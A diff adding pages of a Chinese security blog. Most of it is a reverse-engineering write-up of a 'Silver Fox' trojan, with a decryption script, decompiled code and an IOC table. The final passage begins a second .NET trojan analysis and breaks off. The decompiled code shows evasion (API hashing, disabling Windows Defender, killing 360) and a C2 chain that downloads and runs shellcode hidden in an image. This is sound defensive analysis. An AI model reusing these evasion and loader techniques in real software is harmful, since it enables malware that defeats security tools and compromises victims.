+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>尝试三次银狐第一次因为重度混淆没过，第二个因为最新inno setup壳没有解壳器想直接脱ida分析delphi文件效果有不是很好找其他分析的要编译，今天来讲一讲我分完的这个银狐吧。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529201538337.png" alt="image-20260529201538337"></p>
+<p>开始两个函数第一个是生成器加的函数不用管</p>
+<p>第二个是主要逻辑</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529201716230.png" alt="image-20260529201716230"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529201735406.png" alt="image-20260529201735406"></p>
+<p>进去就是一个花指令然后直接nop</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529201851302.png" alt="image-20260529201851302"></p>
+<p>还有个循环执行也去掉</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529201934584.png" alt="image-20260529201934584"></p>
+<p>前面两个函数不用管是一些用系统时间反调试的函数</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529202056736.png" alt="image-20260529202056736"></p>
+<p>进入最后一个函数看到前面是申请了一块地址去执行sellcode动调进入即可</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529231551679.png" alt="image-20260529231551679"></p>
+<p>接下来的逻辑是先跳到另外的地址把这段代码下面的代码改动</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529202414678.png" alt="image-20260529202414678"></p>
+<p>这个是改动后的代码可以看到是一个循环解密，从1B0023+CA08的位置异或0B1h再和当前地址的字符相加作为下个字符的异或长度为rcx000000000000CA08</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529202449910.png" alt="image-20260529202449910"></p>
+<p>这里可以接着动调将1B0024的位置设为write断点动调后看见跳转到另一个位置</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529203012733.png" alt="image-20260529203012733"></p>
+<p>接下来可以看到另一个shellcode</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529203200021.png"></p>
+<p>这里值放了主要逻辑，前面的函数有一些反调试</p>
+<p>比如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)((__int64 (*)(<span class="type">void</span>))unk_1BC84C)() )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">1000</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = __rdtsc();</span><br><span class="line">    v14 += v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v9, <span class="string">&quot;ExitProcess&quot;</span>);</span><br><span class="line">  v24 = (<span class="type">void</span> (__fastcall *)(_QWORD))((__int64 (__fastcall *)(<span class="type">char</span> *, <span class="type">char</span> *))unk_1BB7FC)(v4, v9);</span><br><span class="line">  v24(<span class="number">0</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后主要这两个函数</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529203737927.png" alt="image-20260529203737927"></p>
+<p>第一个是将数据复制到申请的空间上第二个是解密数据</p>
+<p>在下面还有一个有意思的</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529203912637.png" alt="image-20260529203912637"></p>
+<p>这段代码会一直掉用本函数，呈现给用户的效果就是一直申请管理员权限然后取消了还是弹如果安全意识不过关的人真的会点确认，解决方式也很简单直接关机因病毒的后续逻辑都没执行也就没有持久化</p>
+<p>看下解密的函数</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529204312602.png" alt="image-20260529204312602"></p>
+<p>我选择用idapython来解可以看见下的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">START_ADDR = <span class="number">0x1B002C</span></span><br><span class="line">DATA_LEN = <span class="number">0xAA05</span></span><br><span class="line">XOR_KEY = <span class="string">b&quot;4@e!c!bSL2AeimnwyD4x&quot;</span></span><br><span class="line">key_len = <span class="built_in">len</span>(XOR_KEY)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DATA_LEN):</span><br><span class="line">    current_ea = START_ADDR+i</span><br><span class="line">    orig_byte = ida_bytes.get_byte(current_ea)</span><br><span class="line">    key_byte = XOR_KEY[i % key_len]</span><br><span class="line">    orig_byte = orig_byte ^ key_byte</span><br><span class="line">    ida_bytes.patch_byte(current_ea, orig_byte)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;异或计算完成！&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最后这里就是整个病毒的逻辑这里用代码贴出来</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+30h] [rbp-128h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">16</span>]; <span class="comment">// [rsp+38h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">8</span>]; <span class="comment">// [rsp+48h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-108h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">16</span>]; <span class="comment">// [rsp+60h] [rbp-F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-E8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+80h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+84h] [rbp-D4h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+88h] [rbp-D0h]</span></span><br><span class="line">  <span class="built_in">void</span> (__fastcall *v16)(__int64); <span class="comment">// [rsp+90h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">16</span>]; <span class="comment">// [rsp+98h] [rbp-C0h] BYREF</span></span><br><span class="line">  __int64 (__fastcall *v18)(_QWORD, _QWORD, <span class="type">void</span> *, _QWORD, _DWORD, _DWORD *); <span class="comment">// [rsp+A8h] [rbp-B0h]</span></span><br><span class="line">  <span class="built_in">void</span> (__fastcall *v19)(_QWORD); <span class="comment">// [rsp+B0h] [rbp-A8h]</span></span><br><span class="line">  <span class="built_in">void</span> (__fastcall *v20)(_QWORD); <span class="comment">// [rsp+B8h] [rbp-A0h]</span></span><br><span class="line">  _DWORD v21[<span class="number">38</span>]; <span class="comment">// [rsp+C0h] [rbp-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v17, <span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v9, <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line">  v16 = (<span class="built_in">void</span> (__fastcall *)(__int64))<span class="built_in">sub_1B0C61</span>((__int64)v8, (__int64)v9);</span><br><span class="line">  <span class="built_in">sub_1BA561</span>();</span><br><span class="line">  <span class="built_in">v16</span>(<span class="number">500</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_1B24A1</span>() )             <span class="comment">// 互斥体排斥确保只有一个病毒执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v13 &lt; <span class="number">1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">v16</span>(<span class="number">500</span>i64);</span><br><span class="line">      ++v13;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">sub_1B2C41</span>() &amp;&amp; <span class="built_in">sub_1B27F1</span>() &amp;&amp; <span class="built_in">sub_1B29C1</span>() &amp;&amp; <span class="built_in">sub_1B2721</span>(<span class="number">2u</span>) &amp;&amp; !<span class="built_in">sub_1B23B1</span>() &amp;&amp; !<span class="built_in">sub_1B2D51</span>(<span class="number">10000</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_1B1BE1</span>();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)((__int64 (*)(<span class="type">void</span>))unk_1B1791)() )<span class="comment">//反沙箱，动调</span></span><br><span class="line">      <span class="built_in">main</span>(v5, v4, v6);</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">find360</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(v12, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">      v18 = (__int64 (__fastcall *)(_QWORD, _QWORD, <span class="type">void</span> *, _QWORD, _DWORD, _DWORD *))<span class="built_in">sub_1B0C61</span>(</span><br><span class="line">                                                                                        (__int64)v8,</span><br><span class="line">                                                                                        (__int64)v12);</span><br><span class="line">      <span class="built_in">v18</span>(<span class="number">0</span>i64, <span class="number">0</span>i64, TCPkill360, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">      <span class="built_in">v16</span>(<span class="number">30000</span>i64);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">find360</span>() &amp;&amp; i &lt; <span class="number">1</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)&amp;v21[<span class="number">2</span> * j + <span class="number">12</span>] = <span class="built_in">v18</span>(<span class="number">0</span>i64, <span class="number">0</span>i64, &amp;kill360, <span class="number">0</span>i64, <span class="number">0</span>, &amp;v21[j]);</span><br><span class="line">          <span class="keyword">if</span> ( *(_QWORD *)&amp;v21[<span class="number">2</span> * j + <span class="number">12</span>] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">v16</span>(<span class="number">5000</span>i64);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">find360</span>() )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">v16</span>(<span class="number">10000</span>i64);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">find360</span>() )</span><br><span class="line">        v15 = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">v16</span>(<span class="number">10000</span>i64);</span><br><span class="line">      <span class="built_in">mainkey</span>();</span><br><span class="line">      <span class="built_in">sub_1B2281</span>();</span><br><span class="line">      <span class="built_in">v16</span>(<span class="number">5000</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">mainkey</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(v11, <span class="string">&quot;ExitProcess&quot;</span>);</span><br><span class="line">    v20 = (<span class="built_in">void</span> (__fastcall *)(_QWORD))<span class="built_in">sub_1B0C61</span>((__int64)v8, (__int64)v11);</span><br><span class="line">    <span class="built_in">v20</span>(<span class="number">0</span>i64);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(v10, <span class="string">&quot;ExitProcess&quot;</span>);</span><br><span class="line">    v19 = (<span class="built_in">void</span> (__fastcall *)(_QWORD))<span class="built_in">sub_1B0C61</span>((__int64)v8, (__int64)v10);</span><br><span class="line">    <span class="built_in">v19</span>(<span class="number">0</span>i64);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看见这里的函数调用的大部分都是内核函数</p>
+<p>看下比较关键的函数sub_1B0C61</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1B0C61</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  __int64 (__fastcall *v6)(__int64); <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  __int64 (__fastcall *v7)(__int64, __int64); <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">sub_1B0BA1</span>(<span class="number">1527267390</span>);<span class="comment">//找到 kernel32.dll 的基址</span></span><br><span class="line">  v6 = (__int64 (__fastcall *)(__int64))((__int64 (__fastcall *)(<span class="keyword">struct</span> _LIST_ENTRY *, __int64))sub_1B0A21)(</span><br><span class="line">                                          v2,</span><br><span class="line">                                          <span class="number">1666965384</span>i64);<span class="comment">//找LoadLibraryA</span></span><br><span class="line">  v3 = <span class="built_in">sub_1B0BA1</span>(<span class="number">1527267390</span>);</span><br><span class="line">  v7 = (__int64 (__fastcall *)(__int64, __int64))((__int64 (__fastcall *)(<span class="keyword">struct</span> _LIST_ENTRY *, __int64))sub_1B0A21)(</span><br><span class="line">                                                   v3,</span><br><span class="line">                                                   <span class="number">1227537171</span>i64);<span class="comment">//GetProcAddress</span></span><br><span class="line">  <span class="keyword">if</span> ( v6 &amp;&amp; v7 &amp;&amp; (v8 = <span class="built_in">v6</span>(a1), (v5 = <span class="built_in">v7</span>(v8, a2)) != <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码相当于直接找的系统的dll导出表的函数的地址没有调用api来找以此来免杀前面的shellcode也用了</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1B2281</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 (__fastcall *v1)(_QWORD, <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">char</span> *, _QWORD, _DWORD, _QWORD, _QWORD); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 (__fastcall *v3)(_QWORD, <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">char</span> *, _QWORD, _DWORD, <span class="type">int</span>); <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">24</span>]; <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  result = ((__int64 (*)(<span class="type">void</span>))unk_1B1FA1)();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Shell32.dll&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(v5, <span class="string">&quot;ShellExecuteA&quot;</span>);</span><br><span class="line">    v1 = (__int64 (__fastcall *)(_QWORD, <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">char</span> *, _QWORD, _DWORD, _QWORD, _QWORD))<span class="built_in">sub_1B0C61</span>(</span><br><span class="line">                                                                                                   (__int64)v4,</span><br><span class="line">                                                                                                   (__int64)v5);</span><br><span class="line">    v2 = <span class="built_in">v1</span>(<span class="number">0</span>i64, aOpen, aPowershellExe, aAddMppreferenc, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0</span>i64, v1);<span class="comment">//关闭Windows Defender</span></span><br><span class="line">    result = <span class="built_in">v3</span>(<span class="number">0</span>i64, aOpen_0, aPowershellExe_0, aTryNullIcimMsf, <span class="number">0</span>i64, <span class="number">0</span>, v2);<span class="comment">//全部加入白名单</span></span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529211902144.png" alt="image-20260529211902144"></p>
+<p>这下面两个函数是关闭360和360tcp网络通讯的函数</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529212219419.png" alt="image-20260529212219419"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529212314875.png" alt="image-20260529212314875"></p>
+<p>最后的最后我们来看下病毒执行部分</p>
+<p>一共分别是防杀，c2地址拼接，下载文件，判断qq管家在不，下载图片并解密，执行图片里的shellcode</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529214327317.png" alt="image-20260529214327317"></p>
+<p>在拼接完后就是个凯撒加密结果是https:&#x2F;&#x2F;[host动态获取].oss-cn-beijing.aliyuncs.com&#x2F;tad</p>
+<p>“j.urk” shift&#x3D;17 → s.dat    (下载清单文件)</p>
+<p>“j.agx” shift&#x3D;17 → s.jpg    (藏 shellcode 的图片)</p>
+<p>sub_1B4CA1（）用来从网上下载文件sub_1B4C51用来解密</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529222033549.png" alt="image-20260529222033549"></p>
+<p>这里判断有没有腾讯管家如果有就直接退出程序</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529225111802.png" alt="image-20260529225111802"></p>
+<p>这里下载s.jpg图片再再调整好参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v70 = (__int64 (*)(void))((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_1B5521)(</span><br><span class="line">                            v78[0],</span><br><span class="line">                            LODWORD(v78[2]),</span><br><span class="line">                            HIDWORD(v78[1]));</span><br></pre></td></tr></table></figure>
+
+<p>然后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v99 = v70();</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529225500811.png" alt="image-20260529225500811"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260529225512213.png" alt="image-20260529225512213"></p>
+<p>最后关闭程序</p>
+<p>ioc提取</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th align="center">值</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>C2 域名</td>
+<td align="center">*.oss-cn-beijing.aliyuncs.com</td>
+<td align="center">阿里云北京 OSS，bucket 按受害者主机名动态生成</td>
+</tr>
+<tr>
+<td>C2 路径</td>
+<td align="center">&#x2F;tad</td>
+<td align="center">主载荷下载接口</td>
+</tr>
+<tr>
+<td>C2 路径</td>
+<td align="center">&#x2F;s.jpg</td>
+<td align="center">Shellcode 隐写载体</td>
+</tr>
+<tr>
+<td>C2 路径</td>
+<td align="center">&#x2F;s.dat</td>
+<td align="center"><code>ranchserv.jpg</code> 数据文件</td>
+</tr>
+<tr>
+<td>URL 模板</td>
+<td align="center">https:&#x2F;&#x2F;[hostname].oss-cn-beijing.aliyuncs.com&#x2F;tad</td>
+<td align="center">动态 C2 构造</td>
+</tr>
+</tbody></table>
+<p>结语：此木马运用多层shellcode加载和手动获取内核函数的手段来运行并且主要执行文件要通过云端下载</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9C%A8%E9%A9%AC/" rel="tag"><i class="fa fa-tag"></i> 木马</a>
+              <a href="/tags/%E9%93%B6%E7%8B%90/" rel="tag"><i class="fa fa-tag"></i> 银狐</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block cat-样本分析">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/05/13/5-13%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/13/5-13%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">5.13木马分析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-05-13 21:43:20" itemprop="dateCreated datePublished" datetime="2026-05-13T21:43:20+08:00">2026-05-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>758</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513214405285.png" alt="image-20260513214405285"></p>
+<p>依旧找到主函数这个是net结构拖进dnspy分析由于混淆比较轻就没管（就是一些函数名取地比较混乱）</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513214539382.png" alt="image-20260513214539382"></p>
+<p>这个是主函数分为三个部分字符解密验证，木马运行，c2连接</p>
+<h2 id="解密验证"><a href="#解密验证" class="headerlink" title="解密验证"></a>解密验证</h2><p>主要是这个函数rShUJoWxIfULR.gsItUfYUAszz</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513214930426.png" alt="image-20260513214930426"></p>
+<p>可以看见上面的gsItUfYUAsz是用来解密ip，端口地址的至于下面的xViGYhhkCyrTQ是用来验证签名的（主要逻辑是用解密的公钥来rsa解密的结果和上面数据同时hash对比）</p>
+<p>然后来看看上面的解密逻辑</p>
